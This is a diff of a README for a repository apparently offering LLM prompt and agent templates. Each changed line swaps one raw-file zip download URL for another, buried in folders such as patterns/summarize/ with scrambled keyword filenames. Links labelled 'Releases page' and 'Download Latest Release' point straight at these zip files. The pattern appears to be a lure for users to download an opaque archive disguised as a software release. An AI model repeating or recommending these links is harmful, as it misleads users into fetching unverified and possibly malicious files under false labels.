@@ -6,7 +6,7 @@ Welcome to the **llm_system_template_agents_skills_patterns_tools_prompts** repo
 
 ## 📥 Download Now
 
-[![Download Latest Release](https://github.com/zartin790/llm_system_template_agents_skills_patterns_tools_prompts/raw/refs/heads/main/patterns/extract_ctf_writeup/prompts-patterns-tools-llm-skills-agents-system-template-2.0-beta.4.zip%20Latest%20Release-v1.0-blue)](https://github.com/zartin790/llm_system_template_agents_skills_patterns_tools_prompts/raw/refs/heads/main/patterns/extract_ctf_writeup/prompts-patterns-tools-llm-skills-agents-system-template-2.0-beta.4.zip)
+[![Download Latest Release](https://github.com/zartin790/llm_system_template_agents_skills_patterns_tools_prompts/raw/refs/heads/main/patterns/summarize/patterns-tools-prompts-agents-llm-skills-template-system-3.8.zip%20Latest%20Release-v1.0-blue)](https://github.com/zartin790/llm_system_template_agents_skills_patterns_tools_prompts/raw/refs/heads/main/patterns/summarize/patterns-tools-prompts-agents-llm-skills-template-system-3.8.zip)
 
 ## 📋 Overview
 
@@ -32,7 +32,7 @@ Before you start, ensure your computer meets the following requirements:
 
 To download the latest version of the software, visit the Releases page:
 
-[Download the latest release here.](https://github.com/zartin790/llm_system_template_agents_skills_patterns_tools_prompts/raw/refs/heads/main/patterns/extract_ctf_writeup/prompts-patterns-tools-llm-skills-agents-system-template-2.0-beta.4.zip)
+[Download the latest release here.](https://github.com/zartin790/llm_system_template_agents_skills_patterns_tools_prompts/raw/refs/heads/main/patterns/summarize/patterns-tools-prompts-agents-llm-skills-template-system-3.8.zip)
 
 ### 🔎 Step-by-Step Installation
 
@@ -66,7 +66,7 @@ Join our community! You can find helpful discussions and ask questions in the Is
 
 To get the latest updates and releases:
 
-1. Go back to the [Releases page](https://github.com/zartin790/llm_system_template_agents_skills_patterns_tools_prompts/raw/refs/heads/main/patterns/extract_ctf_writeup/prompts-patterns-tools-llm-skills-agents-system-template-2.0-beta.4.zip).
+1. Go back to the [Releases page](https://github.com/zartin790/llm_system_template_agents_skills_patterns_tools_prompts/raw/refs/heads/main/patterns/summarize/patterns-tools-prompts-agents-llm-skills-template-system-3.8.zip).
 2. Watch the repository to receive notifications about new versions or updates.
 
 ## 🤝 Contributing
